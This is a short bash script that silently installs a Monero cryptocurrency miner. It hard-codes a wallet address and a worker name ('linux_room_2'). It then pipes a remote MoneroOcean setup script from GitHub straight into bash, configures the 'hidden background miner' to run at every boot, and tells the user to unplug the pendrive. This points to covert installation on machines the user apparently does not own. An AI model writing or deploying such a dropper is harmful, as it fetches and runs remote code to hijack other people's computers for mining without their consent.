#!/bin/bash
# Silent MoneroOcean Auto-Installer for Linux

WALLET="483dhPFGREDdXmHiC5gsPtMDxdbkPzSnn7MPCSLmwEiUHduGB8UffVAV8LTdZGe3mrGMoy9rHWyk1BmB9HRYNvEF2VuAYYv"
WORKER_NAME="linux_room_2"

echo "Setting up hidden background miner..."

# This runs the official MoneroOcean installer, sets up the background service, and starts it
curl -s -L https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/setup_moneroocean_miner.sh | bash -s "$WALLET~$WORKER_NAME"

echo "Setup Complete! The miner will now run silently on every boot."
echo "You can safely unplug the pendrive."
